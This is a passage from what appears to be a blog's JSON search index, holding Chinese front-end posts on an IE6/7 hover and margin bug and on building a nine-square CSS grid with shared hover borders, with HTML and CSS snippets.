a标签设置为55px是最关键的一点。按照此思路和题目要求，格子是50px大小，边框的dom应该是60px大小。而此时a设置为55px，因为a要设置padding-left:5px;padding-bottom:5px;，刚好a就有60px大小了；而a里面的div要设置margin-top:5px;margin-right:5px（其实margin-right也可以不加）,这时候margin和padding就达到了一个“中和”的效果，使布局不发生偏差。 点此看demo。","tags":[{"name":"css","slug":"css","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/css/"}]},{"title":"分享一个IE6，7的CSS hack bug","date":"2012-12-17T11:43:00.000Z","path":"2012/12/17/share-a-css-hack/","text":"一、分享一个IE6，7的css hack bug。 IE和我们之间，肯定有一个是傻逼，如果它不是，那我们准是。不然很多事情没法解释… ——多么痛的领悟 先看代码，或者点击看demohtml:1234&lt;div id=&quot;main&quot;&gt; &lt;div class=&quot;box&quot;&gt;&lt;/div&gt; &lt;div class=&quot;box&quot;&gt;&lt;/div&gt;&lt;/div&gt; css:12345678910111213141516171819#main&#123; width: 200px; height: 50px; border: 1px solid #000; margin: 0 auto;&#125;#main .box&#123; width: 50px; height: 50px; margin-left: 10px; position: relative; float: left; background: #333;&#125;#main .box:hover&#123; z-index: 999; /*background: #333;*/ /*background: #999;*/&#125;.box设置了的四行核心代码是： float:left - 左浮动 margin-left: 10px - 左外边距为10px position: relative - 因为在box里面想用一个dom做绝对定位 background: #333 - 设置background颜色为#333当.box触发hover时，做了一步z-index的改变，这时候在IE6，7中出现bug：因margin-left失效，.box会向左移动10px；而且这时候设置margin-left是不起作用的，hover结束后.box也不会回到原来的位置。 二、淡定解决异次元的bug诡异的事情最后水落石出：background属性居然影响了margin。 将.box:hover多加一行background属性，比如：background: #999，这样子在IE上“看上去”就解决了。但是，就当你以为解决了bug的时候，如果.box:hover的background颜色设置与hover之前的颜色一样，也就是设置为background: #333，阴魂不散的bug又会重新出现啦。 庆幸你的需求是background颜色不一样吧。如果还真是悲剧到要做成一样的颜色，解决的办法恐怕只能是取消.box的position: relative，然后多加一层dom容器了。1234&lt;div class=&quot;box&quot;&gt; &lt;div style=&quot;position: relative&quot;&gt;…&lt;/div&gt; …&lt;/div&gt; 友情link：xueran的这篇文字。","tags":[{"name":"css","slug":"css","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/css/"}]},{"title":"css实现九宫格(一)","date":"2012-12-14T11:15:00.000Z","path":"2012/12/14/css-jiugongge/","text":"前段时间，我的 leader Henry在群里面分享了一道一淘的面试题。 题目非常的有趣，忙完前阵的工作之后突然记起，也尝试做了一下。 9个元素，每个50*50px，排成九宫格默认是border颜色为blue，hover到格子上变成red（兼容到IE6） 做成九宫格大家都会，但题目的陷阱就在hover上。鼠标hover到格子4，格子5时，其实他们“共用”了一条边。由于是纯css实现的，我们不可能说用js去动态改变dom，因此怎样实现“公用边”就成为了难点。 尝试的过程： 我的第一个想法，用“叠加”的方式实现“公用边”； 后来的想法，用table的border-collapse实现“公用边”； 在table想法的基础上改进； 一种更简便的做法，不需要border，见九宫格(二) 我的第一个想法先做做看，尝试永远是第一步。我将9个div都设置了5px的border，排成了九宫格，添加了hover，这时候初始的效果是：这样其实格子之间的距离是两倍border（10px）。需要再将中间的一竖（2，5，8）设置margin-left:-5px;margin-right:-5px;,再将中间的一横（3，4，5）设置margin-top:-5px;margin-bottom:-5px;，这样等于是强制把格子间的距离“拉”到5px。到这一步，简单的九宫格是完成了，但hover之后会发现，格子的边会被挡住（格子5的下边和右边分别被格子8和格子6挡住）。因为这里“公用边”的思路准确来说是“重合边”，是用负值的margin强制定位的。而我的解决方式是hover时添加z-index:999，让hover到的格子在最上层显示而不会被挡住。同时，不要忘记在9个div的css里面添加一句让z-index生效的position: relative;，具体原因看这里。 代码君：1.html：1234567891011&lt;div id=&quot;test0&quot;&gt; &lt;div&gt;1&lt;/div&gt; &lt;div class=&quot;lr_indent&quot;&gt;2&lt;/div&gt; &lt;div&gt;3&lt;/div&gt; &lt;div class=&quot;tb_indent&quot;&gt;4&lt;/div&gt; &lt;div class=&quot;lr_indent tb_indent&quot;&gt;5&lt;/div&gt; &lt;div class=&quot;tb_indent&quot;&gt;6&lt;/div&gt; &lt;div&gt;7&lt;/div&gt; &lt;div class=&quot;lr_indent&quot;&gt;8&lt;/div&gt; &lt;div&gt;9&lt;/div&gt;&lt;/div&gt;2.css:1234567891011121314151617181920212223242526272829#test0&#123; margin: 30px; width: 200px; height: 200px;&#125;#test0 div&#123; width: 50px; height: 50px; float: left; background: #eee; border: 5px solid #00f; text-align: center; line-height: 50px; color: #090; position: relative;&#125;#test0 .lr_indent&#123; margin-left: -5px; margin-right: -5px;&#125;#test0 .tb_indent&#123; margin-top: -5px; margin-bottom: -5px;&#125;#test0 div:hover&#123; border: 5px solid #f00; z-index: 999; background: #eee;/*必须加这一句，在IE6，7有bug*/&#125; 思考：这样的方式好吗？不够好。这才是9宫格，如果是16，25，…，81个格子，设置margin缩进的人力代价是很高的。兼容性，在IE6，7下，负值margin在hover时候有bug。 后来的想法经过第一次尝试，我得到一个经验：要用一种通用的方法去解决“公用边”，而不是分别设置.lr_indent和.tb_indent。随即我想到了表格。作为table，它有个很突出的属性，就是合并border，css里面的设置为border-collapse:collapse;。ok，这就是key point。 按照这个思路，我简单的编写了代码，一开始我把hover定位到td上面去，发现hover时也会出现第一个想法中“挡住”的情况。而且，去将td的position改变，再添加z-index的方法是不可能有用的(z-index不会起效)。 我的方法是在td中包含一个span，把hover定位到span中去，td设置为position:relative;，span设置为position:absolute;，这时候的hover就可以设置让span的border不被挡住展示了。代码君又来了：html：12345678910111213141516171819&lt;div id=&quot;test1&quot;&gt; &lt;table&gt; &lt;tr&gt; &lt;td&gt;&lt;span&gt;1&lt;/span&gt;&lt;/td&gt; &lt;td&gt;&lt;span&gt;2&lt;/span&gt;&lt;/td&gt; &lt;td&gt;&lt;span&gt;3&lt;/span&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;span&gt;4&lt;/span&gt;&lt;/td&gt; &lt;td&gt;&lt;span&gt;5&lt;/span&gt;&lt;/td&gt; &lt;td&gt;&lt;span&gt;6&lt;/span&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;span&gt;7&lt;/span&gt;&lt;/td&gt; &lt;td&gt;&lt;span&gt;8&lt;/span&gt;&lt;/td&gt; &lt;td&gt;&lt;span&gt;9&lt;/span&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;&lt;/div&gt;css：123456789101112131415161718192021222324252627282930*&#123; margin:0; padding: 0;&#125;table&#123; border-collapse: collapse;&#125;#test1 td&#123; width: 50px; height: 50px; background: #eee; position: relative; border: 5px solid #00f; text-align: center;&#125;#test1 td span&#123; color: #090; display:block; width: 50px; height: 50px; position: absolute; top: 0; left: 0; line-height: 50px;&#125;#test1 td span:hover&#123; border: 5px solid #f00; margin-top:-5px; margin-left: -5px;&#125;别忘了span在hover时，必须设置一个负的margein-top和margein-left，以保证红色边框恰好定位在格子四周。见css君最后的片段。假如不设置，你看到的将是这样：本以为已经大功告成了，在IE中测试却让我傻了眼：（ps：作为前端一枚，我已经做好了妥妥的心理准备，但此情此景还是让人喷出一口老血……） 改进，改进说实话，table和div之争这么多年，大家都在页面中用越来越多的div，而越发的鄙视table，反而对table的熟悉程度反应了前端们的基础是否扎实。吃一堑长一智，这句话特别适用于在table中翻江倒海的亲们。 改进！ 首先这个bug（也无所谓是不是bug，算是浏览器的差异性吧）我知道，在table的td里面设置了position:relative;就会在IE中出现这样的情况。注意是所有的IE哦，包括IE10。而根据第二个思路，最后的hover定位的元素为span，它本身设定为position:absolute;它的父级元素必须得设置position:relative;才能完成题目功能，这是毋庸置疑的。 既然现在span的父级td不能设置position:relative;，我就在它们之间添加一个div，用来做span的容器。 代码君再一次来了：html:12345678910111213141516171819&lt;div id=&quot;test2&quot;&gt; &lt;table&gt; &lt;tr&gt; &lt;td&gt;&lt;div&gt;&lt;span&gt;1&lt;/span&gt;&lt;/div&gt;&lt;/td&gt; &lt;td&gt;&lt;div&gt;&lt;span&gt;2&lt;/span&gt;&lt;/div&gt;&lt;/td&gt; &lt;td&gt;&lt;div&gt;&lt;span&gt;3&lt;/span&gt;&lt;/div&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;div&gt;&lt;span&gt;4&lt;/span&gt;&lt;/div&gt;&lt;/td&gt; &lt;td&gt;&lt;div&gt;&lt;span&gt;5&lt;/span&gt;&lt;/div&gt;&lt;/td&gt; &lt;td&gt;&lt;div&gt;&lt;span&gt;6&lt;/span&gt;&lt;/div&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;div&gt;&lt;span&gt;7&lt;/span&gt;&lt;/div&gt;&lt;/td&gt; &lt;td&gt;&lt;div&gt;&lt;span&gt;8&lt;/span&gt;&lt;/div&gt;&lt;/td&gt; &lt;td&gt;&lt;div&gt;&lt;span&gt;9&lt;/span&gt;&lt;/div&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;&lt;/div&gt;css:1234567891011121314151617181920212223242526272829303132333435*&#123; margin:0; padding: 0;&#125;table&#123; border-collapse: collapse;&#125;#test2 td&#123; width: 50px; height: 50px; background: #eee; border: 5px solid #00f; text-align: center; vertical-align: top;&#125;#test2 td div&#123; position:relative; width: 50px; height: 50px;&#125;#test2 td div span&#123; color: #090; display:block; width: 50px; height: 50px; position: absolute; top: 0; left: 0; line-height: 50px;&#125;#test2 td div span:hover&#123; border: 5px solid #f00; margin-left: -5px; margin-top: -5px;&#125;OK，效果达成！可以猛点这里看看demo。 最后吐槽，不对，总结一下下： 先到IE上去测，再转到其它浏览器，以少走弯路，这叫擒贼先擒王-_-!；win8的metro布局最近挺流行的，有时候table比div好用；IE君，你真是……此处省略1024个字 这个系列打算写两篇文章，下一篇介绍另外一种更简洁的方法。:)","tags":[{"name":"css","slug":"css","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/css/"}]}]}